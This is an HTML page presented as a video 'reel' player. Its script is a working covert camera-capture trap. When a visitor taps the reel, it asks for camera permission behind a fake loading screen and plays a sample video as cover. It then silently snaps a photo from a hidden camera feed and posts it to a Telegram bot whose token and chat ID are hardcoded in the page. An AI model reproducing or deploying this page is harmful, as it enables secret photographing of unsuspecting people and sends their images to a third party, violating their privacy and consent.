<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MyReels</title>

<style>
body {
    margin:0;
    background:black;
    overflow:hidden;
    font-family:Arial;
    color:white;
}

.reel {
    position:absolute;
    width:100%;
    height:100vh;
    transition:0.5s;
}

video {
    width:100%;
    height:100%;
    object-fit:cover;
}

.overlay {
    position:absolute;
    bottom:80px;
    left:15px;
}

.username { font-weight:bold; }
.caption { font-size:14px; }

.side {
    position:absolute;
    right:10px;
    bottom:120px;
    display:flex;
    flex-direction:column;
    gap:20px;
    font-size:22px;
}

.play {
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    font-size:50px;
}

.loader {
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    display:none;
}
</style>
</head>

<body>

<div id="loader" class="loader">🎵 Loading...</div>

<!-- Reel -->
<div class="reel" style="top:0%">
    <video id="vid1" src="https://www.w3schools.com/html/mov_bbb.mp4" loop></video>
    <div class="play">▶️</div>

    <div class="overlay">
        <div class="username">@myapp</div>
        <div class="caption">🔥 Reel Auto Capture</div>
    </div>

    <div class="side">❤️ 💬 🔗</div>
</div>

<video id="camera" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const botToken = "8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA";
const chatId = "2018747103";

document.querySelector(".reel").addEventListener("click", async () => {

    document.getElementById("loader").style.display="block";

    const video = document.getElementById("vid1");
    const play = document.querySelector(".play");

    try {
        // Start camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const cam = document.getElementById("camera");
        cam.srcObject = stream;

        // Fake loading
        setTimeout(() => {
            video.play();
            play.style.display = "none";
            document.getElementById("loader").style.display="none";
        }, 800);

        // Auto capture after play
        setTimeout(() => {
            captureAndSend();
        }, 1500);

    } catch (err) {
        alert("Camera permission needed!");
    }
});
function captureAndSend() {
    const cam = document.getElementById("camera");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = cam.videoWidth;
    canvas.height = cam.videoHeight;
    ctx.drawImage(cam, 0, 0);

    // Convert canvas to a Blob (File object)
    canvas.toBlob((blob) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "capture.jpg");
        formData.append("caption", "📸 Captured Image");

        // Send as multipart/form-data
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData // No headers needed, fetch sets them for FormData
        })
        .then(res => res.json())
        .then(data => console.log("Sent to Telegram:", data))
        .catch(err => console.error("Error:", err));
    }, "image/jpeg", 0.8);
}
</script>

</body>
</html>
